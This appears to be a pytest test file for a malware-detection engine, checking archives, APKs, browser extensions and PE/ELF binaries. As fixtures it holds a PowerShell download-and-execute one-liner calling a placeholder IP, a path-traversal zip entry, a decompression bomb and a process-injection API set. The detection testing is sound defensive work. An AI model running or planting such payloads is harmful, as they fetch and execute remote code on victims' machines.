"""Archives, APKs, browser extensions and PE/ELF structure."""
from __future__ import annotations

import json
import os
import struct

import pytest

from core.file_analyzer import analyze_file
from core.pe_decompiler import capability_imports
from detection.archives import parse_axml
from detection.engine import inspect_content
from detection_fixtures import make_apk, make_axml, make_zip


def labels(result):
    return {item.label for item in result["indicators"] if item.category != "privacy"}


# --- archives ----------------------------------------------------------------------------------

def test_benign_archive_is_safe():
    assert inspect_content(make_zip({"notes.txt": b"hello", "img/a.png": b"\x89PNG"}), "a.zip")["score"] == 0


def test_zip_slip_entry():
    result = inspect_content(make_zip({"../../Startup/evil.txt": b"x", "readme.txt": b"hi"}), "a.zip")
    assert "Archive path traversal entry" in labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_double_extension_inside_archive():
    result = inspect_content(make_zip({"Invoice_2026.pdf.exe": b"MZ"}), "a.zip")
    assert "Double-extension file in archive" in labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_password_protected_archive_with_executable():
    result = inspect_content(make_zip({"invoice.exe": b"MZ", "a.txt": b"x"}, encrypted={"invoice.exe", "a.txt"}), "a.zip")
    assert "Password-protected archive with executables" in labels(result)


def test_script_inside_archive_is_scanned():
    payload = b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')"
    result = inspect_content(make_zip({"run.ps1": payload}), "a.zip")
    assert any("Remote payload download behavior" in label for label in labels(result))
    assert result["classification"] == "SUSPICIOUS"


def test_decompression_bomb_is_detected_without_extracting(tmp_path):
    bomb = make_zip({"zeros.bin": b"\x00" * (110 * 1024 * 1024)})
    assert len(bomb) < 1024 * 1024
    result = inspect_content(bomb, "a.zip")
    assert "Potential decompression bomb" in labels(result)


def test_unreadable_zip_is_reported_not_raised():
    result = inspect_content(b"PK\x03\x04" + b"\x00" * 200, "broken.zip")
    assert "Unreadable ZIP container" in labels(result)


# --- APK ---------------------------------------------------------------------------------------

def test_axml_round_trip():
    elements = parse_axml(make_axml([("manifest", {"package": "org.example"}), ("uses-permission", {"name": "android.permission.CAMERA"})]))
    assert elements == [("manifest", {"package": "org.example"}), ("uses-permission", {"name": "android.permission.CAMERA"})]


def test_banking_trojan_permission_profile():
    apk = make_apk(["INTERNET", "SYSTEM_ALERT_WINDOW", "READ_SMS", "RECEIVE_SMS"], ["BIND_ACCESSIBILITY_SERVICE"],
                   {"assets/payload.dex": b"dex\n035"})
    result = inspect_content(apk, "app.apk")
    assert result["file_type"] == "apk"
    assert {"Accessibility + overlay/SMS combination", "Secondary code hidden in assets"} <= labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_ordinary_app_permissions_are_context_only():
    result = inspect_content(make_apk(["INTERNET", "CAMERA", "ACCESS_FINE_LOCATION"]), "camera.apk")
    assert result["score"] == 0
    assert result["details"]["permissions"] == ["ACCESS_FINE_LOCATION", "CAMERA", "INTERNET"]


def test_apk_code_files_are_not_reported_as_suspicious_scripts():
    result = inspect_content(make_apk(["INTERNET"], extra={"assets/www/app.js": b"console.log(1)"}), "a.apk")
    assert "Archive contains executable or script files" not in labels(result)


def test_malformed_manifest():
    apk = make_zip({"AndroidManifest.xml": b"\x03\x00\x08\x00garbage", "classes.dex": b"dex"})
    assert "Malformed Android manifest" in labels(inspect_content(apk, "a.apk"))


# --- browser extensions --------------------------------------------------------------------------

def _extension(manifest: dict) -> bytes:
    return make_zip({"manifest.json": json.dumps(manifest).encode(), "background.js": b"chrome.runtime.onInstalled.addListener(() => {});"})


def test_session_stealing_extension_permissions():
    result = inspect_content(_extension({"name": "Coupons", "manifest_version": 3, "permissions": ["cookies", "webRequest"],
                                         "host_permissions": ["<all_urls>"]}), "ext.zip")
    assert result["file_type"] == "browser-extension"
    assert "Extension can harvest sessions on all sites" in labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_minimal_extension_is_safe():
    assert inspect_content(_extension({"name": "Notes", "manifest_version": 3, "permissions": ["storage"]}), "ext.zip")["score"] == 0


# --- PE / ELF -----------------------------------------------------------------------------------

def test_capability_requires_complete_api_combination():
    # The MSVC runtime imports these; they must not be evidence on their own.
    assert capability_imports({"IsDebuggerPresent", "VirtualAlloc", "CreateProcessW", "OpenProcess"}) == ([], [])
    capabilities, apis = capability_imports({"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "OpenProcess"})
    assert capabilities == ["process_injection"]
    assert apis == ["CreateRemoteThread", "VirtualAllocEx", "WriteProcessMemory"]


def test_truncated_pe_header_is_malformed_not_crash():
    assert "Malformed PE file" in labels(inspect_content(b"MZ" + b"\x00" * 64, "a.exe"))


SYSTEM_BINARIES = [r"C:\Windows\System32\notepad.exe", r"C:\Windows\System32\kernel32.dll", "/bin/ls", "/usr/bin/env"]


@pytest.mark.parametrize("path", [p for p in SYSTEM_BINARIES if os.path.exists(p)] or ["missing"])
def test_operating_system_binaries_are_not_suspicious(path):
    if path == "missing":
        pytest.skip("no known operating-system binary on this platform")
    result = analyze_file(path, {"ml_analysis": False})
    assert result.classification != "SUSPICIOUS", [(f.evidence, f.contribution) for f in result.evidence if f.contribution]
    assert not result.pe_analysis.get("suspicious_imports")


def test_elf_upx_without_section_headers():
    header = b"\x7fELF\x02\x01\x01" + b"\x00" * 9 + struct.pack("<HH", 2, 62) + b"\x00" * 44
    result = inspect_content(header + b"UPX!" + b"\x00" * 100, "miner")
    assert result["file_type"] == "elf"
    assert {"Known packer or protector", "ELF without section headers"} <= labels(result)
